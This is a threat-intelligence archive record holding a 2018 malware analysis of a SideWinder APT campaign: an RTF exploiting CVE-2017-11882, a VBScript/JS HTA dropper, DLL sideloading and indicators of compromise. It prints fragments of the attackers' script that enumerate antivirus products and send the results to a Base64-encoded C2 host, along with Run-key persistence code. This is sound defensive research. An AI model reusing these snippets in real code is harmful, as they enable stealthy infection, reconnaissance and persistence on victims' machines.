{
    "id": "d1ee3eff-0641-413a-810e-3cacddd6e9c6",
    "created_at": "2022-10-25T16:48:23.307355Z",
    "updated_at": "2025-03-27T02:15:11.010525Z",
    "deleted_at": null,
    "sha1_hash": "ad122d87969c575dd5e33baa8fb1d9c81ba87a37",
    "title": "APT Sidewinder changes theirs TTPs to install their backdoor.",
    "authors": "",
    "file_creation_date": "2018-10-24T06:27:07Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 170143,
    "plain_text": "# APT Sidewinder changes theirs TTPs to install their backdoor.\n\n**[medium.com/@Sebdraven/apt-sidewinder-changes-theirs-ttps-to-install-their-backdoor-f92604a2739](https://medium.com/@Sebdraven/apt-sidewinder-changes-theirs-ttps-to-install-their-backdoor-f92604a2739)**\n\nSebdraven October 18, 2018\n\nA new RTF (9001056791a03ec998f26805d462bc2ca336b2c3aeac2e210f73ff841dfe3eec) has\njust been discovered and it’s the same toolset that is used to create their exploit.\n\nThe RTF exploits CVE-2017–11882 to dowload a file HTA on hxxp://webservredir.net/includes/b7199e61/-1/5272/fdbfcfc1/final using mshtmll.dll and RunHTMLApplication\nand records that in caller.exe.\n\nSidewinder gives up the powershell in the HTA and all stuff is written in vbs. The goal of this\nchange is to be more furtive. Many malware used Powershell and many papers describe how to\nlog correctly the execution of powershell.\n\nThe HTA file checks with WMI the Antivirus Installed and send the informations on the C2.\n\n_var objWMIService = GetObject(“winmgmts:\\\\\\\\.\\\\root\\\\SecurityCenter2”);_\n_var colItems = objWMIService.ExecQuery(“Select * From AntiVirusProduct”, null, 48);_\n_var objItem = new Enumerator(colItems);_\n\nand\n\n_for (;!objItem.atEnd();objItem.moveNext()) {_\n_x += (objItem.item().displayName + ‘ ‘ + objItem.item().productState).replace(“ “,””);_\n_}_\n\nand\n\nif(iss(ll(x),”avast”)==0 && iss(ll(x),”360\")==0)\n{\n\n\n-----\n\n_Base64Decode( aHR0cDovL3dlYnNlcnYtcmVkaXIubmV0 )+Base64Decode( L3BsdWdpbnMv )+ -_\n_1/5272/true/true/”+x, 0);_\n_ointernet.send();_\n_}catch(e){}_\n_}_\n\n_if(iss(ll(x),”avast”)==0 && iss(ll(x),”kasper”)==0)_\n_{_\n_oShell.Run(pz,0,false);_\n_try{_\n_ointernet.open(“GET”,_\n_Base64Decode(“aHR0cDovL3dlYnNlcnYtcmVkaXIubmV0”)+Base64Decode(“L3BsdWdpbnMv”)+”-_\n_1/5272/true/true/done”, 0);_\n_ointernet.send();_\n_}catch(e){}_\n_}}catch(e){}finally{window.close();}_\n\nIf the AV are installed, the script is stopped.\n\nThe chains infections has changed a bit.\n\nIn the HTA file, there is a zip file. In the zipfile, there are an exe nammed FinalBot.exe. The file\nbecome Srvstr.exe in the directory: ExtractTo=din&”\\Srvstr\\dat”\n\nThe backdoor has a persistance in the run key.\n\n_oShell.RegWrite(“HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WinSrv”,_\n_pz, “REG_SZ”);_\n\nAnd the backoor is launched like that:\n\nThe HTA File decodes cmpbk32.dll whith two file hj.txt in \\Srvstr\\dat and call cmd.exe after\ncopying in \\Srvstr\\dat.\n\nthe cmd.exe uses cmpbk32.dll by sideloding.\n\nAnd in the entrypoint of the dll, cmpbk32.dll calls fn_0x10001000 for using WinExec to execute\nSrvstr.exe FFFFFFFF00001498 .\n\n\n-----\n\nThe backdoor has developped in VB and used the 8EBECD7C.dll (msvbvm60.dll modified).\n\n_data = readBinary(win&”\\system32\\msvbvm60.dll”)_\n_data = Replace(data,”__vba”,”__zbc”)_\n_writeBinary data,ExtractTo&”\\8EBECD7C.dll”_\n\nFor Intezer, the backdoor is the family of Sidewinder.\n\n[https://analyze.intezer.com/#/analyses/c2e4ee74-63ed-4222-b072-0387a32cef71](https://analyze.intezer.com/#/analyses/c2e4ee74-63ed-4222-b072-0387a32cef71)\n\n## Indicators\n\n7c76c3c9e8569e102ba083a64d22cf46920e3566d7e940b54fb1e6c628e6610f Test.Zip\n\n8c16ebad57e0288077ae58607b2967bf7b40761b20d783814d655280e9779e99 FinalBot.exe\ndd5c74f195b7ba0cd06fe3b899125c09440ce14648080f520c06857e4001ff54 hj1.txt\n7bd7cec82ee98feed5872325c2f8fd9f0ea3a2f6cd0cd32bcbe27dbbfd0d7da1 hj.txt\n\nwebserv-redir.net 185.106.120.43\n\nheartissuehigh win 185 106 120 43\n\n\n-----\n\nwww.webserv-redir.net 185.106.120.43\n\nhxxp://www.webserv-redir.net/images/67381F0B/-1/5272/3cdc4fcb/main.RTF\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.10.18.APT_Sidewinder_changes/APT%20Sidewinder%20changes%20theirs%20TTPs%20to%20install%20their%20backdoor.pdf"
    ],
    "report_names": [
        "APT Sidewinder changes theirs TTPs to install their backdoor"
    ],
    "threat_actors": [
        {
            "id": "6b9fc913-06c6-4432-8c58-86a3ac614564",
            "created_at": "2022-10-25T16:07:24.185236Z",
            "updated_at": "2025-03-27T02:02:10.135195Z",
            "deleted_at": null,
            "main_name": "SideWinder",
            "aliases": [
                "APT-C-17",
                "APT-Q-39",
                "BabyElephant",
                "GroupA21",
                "HN2",
                "Hardcore Nationalist",
                "Rattlesnake",
                "Razor Tiger",
                "SideWinder",
                "T-APT-04"
            ],
            "source_name": "ETDA:SideWinder",
            "tools": [
                "BroStealer",
                "Capriccio RAT",
                "callCam"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "173f1641-36e3-4bce-9834-c5372468b4f7",
            "created_at": "2022-10-25T15:50:23.349637Z",
            "updated_at": "2025-03-27T02:00:55.450857Z",
            "deleted_at": null,
            "main_name": "Sidewinder",
            "aliases": [
                "Sidewinder",
                "T-APT-04"
            ],
            "source_name": "MITRE:Sidewinder",
            "tools": [
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d0c0a5ea-3066-42a5-846c-b13527f64a3e",
            "created_at": "2023-01-06T13:46:39.080551Z",
            "updated_at": "2025-03-27T02:00:02.992026Z",
            "deleted_at": null,
            "main_name": "RAZOR TIGER",
            "aliases": [
                "SideWinder",
                "APT-C-17",
                "T-APT-04"
            ],
            "source_name": "MISPGALAXY:RAZOR TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041711,
    "ts_creation_date": 1540362427,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/ad122d87969c575dd5e33baa8fb1d9c81ba87a37.pdf",
        "text": "https://archive.orkl.eu/ad122d87969c575dd5e33baa8fb1d9c81ba87a37.txt",
        "img": "https://archive.orkl.eu/ad122d87969c575dd5e33baa8fb1d9c81ba87a37.jpg"
    }
}